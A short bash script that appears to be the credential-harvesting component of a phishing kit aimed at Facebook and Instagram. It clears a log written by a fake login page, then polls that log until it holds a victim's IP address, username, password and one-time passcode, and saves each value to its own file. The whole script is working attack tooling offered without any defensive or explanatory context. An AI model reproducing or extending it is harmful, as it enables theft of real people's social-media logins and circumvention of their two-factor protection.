#!/bin/bash
arg="$1"
if [[ $arg == 'facebook' ]]; then
  site="facebook"
  first="IP:"
  second="Username:"
  third="Password:"
  fourth="OTP:"
elif [[ $arg == 'instagram' ]]; then
  site="instagram"
  first="IP:"
  second="Account:"
  third="Password:"
  fourth="OTP:"
else
  printf "Sorry but this website not configured in ${0} yet!\n"
  killall python3 >/dev/null 2>&1
  exit 1
fi
printf "" > assets/sites/${site}/log.txt
printf ""> process/username.txt
printf ""> process/password.txt
printf ""> process/otp.txt
printf ""> process/ip.txt
while true; do
ip=$(cat assets/sites/${site}/log.txt | grep "$first" | awk '{print $2}')
username=$(cat assets/sites/${site}/log.txt | grep "$second" | awk '{print $2}')
password=$(cat assets/sites/${site}/log.txt | grep "$third" | awk '{print $2}')
otp=$(cat assets/sites/${site}/log.txt | grep "$fourth" | awk '{print $2}')
if [[ ! -z "$username" && ! -z "$password" && ! -z "$otp" ]]; then
  if [ -z $ip ]; then
    ip="unabled_to_capture"
  fi
printf "$ip"> process/ip.txt
printf "$username"> process/username.txt
printf "$password"> process/password.txt
printf "$otp"> process/otp.txt
break
fi
done
